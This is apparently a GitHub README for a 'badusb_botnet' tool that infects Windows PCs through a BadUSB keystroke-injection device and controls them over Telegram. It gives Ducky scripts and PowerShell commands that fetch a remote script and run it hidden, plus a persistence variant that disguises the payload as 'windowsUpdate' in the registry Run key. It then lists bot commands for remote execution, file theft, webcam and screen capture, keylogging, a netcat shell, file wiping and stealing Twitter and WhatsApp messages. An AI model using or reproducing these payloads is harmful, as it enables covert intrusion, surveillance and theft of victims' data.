# badusb_botnet
:smiling_imp::busts_in_silhouette: Infect a pc with badusb and establish a connection through telegram.

## Option 1

```
> (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
> powershell.exe -windowstyle hidden -file poc.ps1
```

```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
DELAY 500
ENTER
STRING powershell.exe -windowstyle hidden -file poc.ps1
DELAY 500
ENTER
```

## Option 2 (Backdoor)

```
> reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
> Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
```
```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
DELAY 500
ENTER
STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
DELAY 500
ENTER
STRING reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
DELAY 500
ENTER
```

### Telegram Options

#### Basic

- /list (List all devices availables)
- /select ```IP``` ```command``` (Execute a command in a PC)
- /stop ```IP``` (Stop remote connection with a PC)
- /cleanAll ```IP``` (Clean all files in a PC)
- /ipPublic ```IP``` (Geolocate IP)
- /download ```IP``` ```file``` (Download a file from a PC)

#### Advanced

- /screenshot ```IP``` (Capture screen of a PC)
- /backdoor ```IP``` (Creates a persistent backdoor in a PC)
- /webcam ```IP```
- /nc ```IP``` (nc -lp 8888)
- /keylogger ```IP``` ```time``` [It doesn't work]

#### Ultra :squirrel: 

- /hackT ```IP``` (Get Twitter dms if the victim is authenticated) [Only web - W10]
- /hackW ```IP``` (Get WhatsApp messages if the victim is authenticated) [Only Web - W10]
- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="15px" height="15px" /> /twitch ```IP``` ```STREAM_KEY```

##### {TODO}

- Change all Invoke-WebRequest to cURL. (Invoke-WebRequest requires set up Internet Explorer)
- Hack WhatsApp on .exe.
- Fix Twitch streaming.
- Fix keylogger.
- Add monitor selector to screenshot.
- Add windows version detector in HackTwitterW10() and hackWhatsAPPW10() functions.
